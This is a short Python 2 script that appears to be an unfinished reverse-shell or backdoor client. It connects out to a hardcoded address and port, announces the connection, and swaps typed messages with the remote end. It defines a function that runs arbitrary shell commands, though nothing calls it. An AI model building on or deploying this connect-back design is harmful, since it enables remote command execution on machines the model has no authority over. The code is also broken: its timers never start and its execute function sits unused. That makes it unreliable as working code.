#!/usr/bin/env python
import socket, subprocess
from threading import Timer

def execute_system_commands(command):
    return subprocess.check_output(command, shell=True)
def msg_receive():
    command = s.recv(1024)
    print(command)
    Timer(1, msg_receive)
def msg_send():
    data = raw_input("Give message: ")
    s.send(data)
    Timer(1, msg_send)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.184.154",4455))
s.send("\n[+] Connection Established\n")

while True:
    msg_send()
    msg_receive()



s.close()

